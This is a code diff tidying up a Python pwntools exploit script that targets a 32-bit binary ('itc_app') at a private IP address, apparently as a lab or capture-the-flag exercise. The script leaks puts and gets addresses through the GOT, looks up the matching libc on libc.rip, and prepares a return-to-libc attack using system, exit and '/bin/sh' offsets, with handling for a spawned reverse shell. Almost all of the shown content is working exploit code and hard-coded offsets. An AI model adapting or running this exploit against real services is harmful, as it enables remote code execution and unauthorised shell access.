@@ -1,22 +1,31 @@
-import requests
 import json
-from pwn import remote, process, u32, p32, p64, flat, log
+import requests
+from pwn import remote, u32, p32, flat, log
 
+# Connection Information
 conn = '192.168.0.155'
 port = 9000
 
+# Output Lines Configuration
 outputLines_b = 6
 outputLines_a = 2
 
-leakDelim = b"Welcome"
-
+# Static Configuration
 static = "./itc_app"
+buffSize = 132
 
-headers1 = {'Content-Type': 'application/json'}
-headers2 = headers1
-# (Baumstark, 2020)
+# URLs and Headers for API Requests
 findLibcUrl = 'https://libc.rip/api/find'
 libcSearchUrl = "https://libc.rip/api/libc/"
+HEADERS = {'Content-Type': 'application/json'}
+
+# Function Offsets
+pltPuts = 0x8048340
+pltGets = 0x08048330
+mainAddr = 0x804847b
+gotPuts = 0x80497ac
+gotGets = 0x80497a8
+
 redirectStdErr = True
 
 # Check if reverse shell was spawned then handle user input and output for the process
@@ -117,7 +126,7 @@ def attemptR2Libc(putsOffset, systemOffset, exitOffset, binShOffset):
 # Get an array of all the potential libc versions that fit the puts and gets offsets provided
 def findPotentialLibcs(putsAddr,getsAddr):
     data = {"symbols": {"puts": hex(putsAddr),"gets": hex(getsAddr)}}
-    response = requests.post(findLibcUrl, headers=headers1, data=json.dumps(data))
+    response = requests.post(findLibcUrl, headers=HEADERS, data=json.dumps(data))
     responseJson = response.json()
     log.success(f"Retrieved potential libc versions for puts: {hex(putsAddr)} and gets: {hex(getsAddr)}")
     return responseJson
@@ -132,7 +141,7 @@ def getLibcSymbolOffsets(libcJson):
     findSymbols = {"symbols": ["exit", "mprotect", "malloc", "memcpy"]}
 
     # Request symbols from the datatbase
-    response = requests.post(libcUrl, headers=headers2, data=json.dumps(findSymbols))
+    response = requests.post(libcUrl, headers=HEADERS, data=json.dumps(findSymbols))
     symbolJson = response.json()
 
     # Store the symbols into variables
@@ -148,14 +157,6 @@ def getLibcSymbolOffsets(libcJson):
     return putsOff, systemOff, exitOff, bin_shOff, mprotectOff, printfOff
 
 if __name__ == "__main__":
-    buffSize = 132
-    
-    # Function offsets (these don't change due to PIE being disabled)
-    pltPuts = 0x8048340
-    pltGets = 0x08048330
-    mainAddr = 0x804847b
-    gotPuts = 0x80497ac
-    gotGets = 0x80497a8
     
     putsAddr = leakViaPuts(conn,port,gotPuts)
     getsAddr = leakViaPuts(conn,port,gotGets,msg="gets")
